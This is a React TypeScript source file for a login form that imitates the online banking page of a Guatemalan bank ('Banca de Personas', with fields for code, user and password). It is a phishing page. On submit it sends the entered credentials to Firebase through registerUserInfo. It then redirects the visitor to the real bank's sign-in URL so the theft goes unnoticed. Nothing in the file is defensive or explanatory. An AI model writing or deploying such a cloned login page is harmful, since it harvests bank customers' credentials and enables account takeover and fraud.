import { ChangeEvent, FormEvent, useState } from 'react'
import './Form.css'
import { UserFormData } from '@/interfaces/user'
import { registerUserInfo } from '@/firebase'

export const Form = () => {
	const [formState, setFormState] = useState<UserFormData>({
		code: '',
		userName: '',
		password: ''
	})
	const { code, userName, password } = formState

	const onSubmit = async (e: FormEvent<HTMLFormElement>): Promise<void> => {
		e.preventDefault()
		try {
			await registerUserInfo({ code, password, userName })
			window.location.href = 'https://www.bienlinea.bi.com.gt/InicioSesion/Inicio/Autenticar'
		} catch (error) {
			console.log("Error", error);

		}
	}

	const onInputChange = ({ target }: ChangeEvent<HTMLInputElement>): void => {
		const { name, value } = target;
		setFormState({
			...formState,
			[name]: value,
		});
	}

	return (
		<section className='form-container bi-border-radious'>
			<h2 className='form-title'>Banca de Personas</h2>
			<form onSubmit={onSubmit}>
				<div>
					<label className='input-label'>
						Código
						<div className='input-container'>
							<div className='input-icon'>
								<span className="icon-grid"></span>
							</div>
							<input type="text" placeholder='Código' value={code} onChange={onInputChange} name='code' />
						</div>
					</label>
				</div>
				<div>
					<label className='input-label'>
						Usuario
						<div className='input-container'>
							<div className='input-icon'>
								<span className="icon-user"></span>
							</div>
							<input type="text" placeholder='Usuario' value={userName} onChange={onInputChange} name='userName' maxLength={10} />
						</div>
					</label>
				</div>
				<div>
					<label className='input-label'>
						Contraseña
						<div className='input-container'>
							<div className='input-icon'>
								<span className="icon-lock"></span>
							</div>
							<input type="password" placeholder='Contraseña' value={password} onChange={onInputChange} name='password' maxLength={15} />
						</div>
					</label>
				</div>
				<button type='submit' className='form-signin-button'>
					<div className='signin-button-icon'>
						<span className="icon-login"> </span>
					</div>
					{" "}Iniciar sesión
				</button>
			</form>
			<a href="/" className='forgot-password-link'>Olvidé mi contraseña</a>
		</section>
	)
}